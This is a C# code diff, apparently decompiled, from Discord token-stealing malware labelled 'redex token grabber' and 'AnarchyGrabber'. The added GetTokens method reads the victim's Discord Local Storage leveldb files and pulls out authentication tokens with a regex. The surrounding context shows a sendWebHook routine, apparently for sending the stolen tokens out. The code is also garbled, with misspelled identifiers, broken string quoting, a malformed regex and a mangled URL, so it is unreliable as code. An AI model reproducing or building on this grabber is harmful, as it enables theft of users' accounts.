@@ -87,7 +87,7 @@ public static void sendWebHook(string discordWebHook,   string content)
                 "redex token grabber"
             },
             {
-                "https//cdn.discordapp.com/attachments/652f40427e1f5186ad54836074898279/discord -icon-png-13.png"
+                "undefined//discord.com/assets/652f40427e1f5186ad54836074898279.png"
 
             }
         };
@@ -96,5 +96,35 @@ public static void sendWebHook(string discordWebHook,   string content)
         {
         }
     }
+    //AnarchyGrabber.Grabber   
     // token: RID:366 RVA:0x00008888 File Offset:e
-    
+    public static List<string> GetTokens(string dir, bool checklogs = false)
+    {
+        DirectoryInfo directoryinfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\"
+        + dir + "\\Local Storage\\leveldb");
+        List<string> list = new List<string>();
+        try 
+        {
+            foreach (FileInfo fileinfo in directoryinfo.Getfiles(checklogs ? "".log" : "".ldb"))
+            {
+                string input = fileInfo.OpenText().ReadToEnd();
+                foreach (object obj in regex.Matches(input, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-}{27}"))
+                {
+                    Match macht2 = (Match)ojb2;
+                    list.Add(macht2.Value);
+                }
+            }
+        }
+        catch
+        {
+        }
+        list = list.Distinct<string>().Tolist<string>();
+        bool flag = list.Count > 0;
+        if (flag)
+        {
+            Grabber.TokensFound = true;
+            List<string> list2 = list;
+            int index = list.Count - 1;
+            list2[index]+= " -NEWEST";
+        }
+        return list;
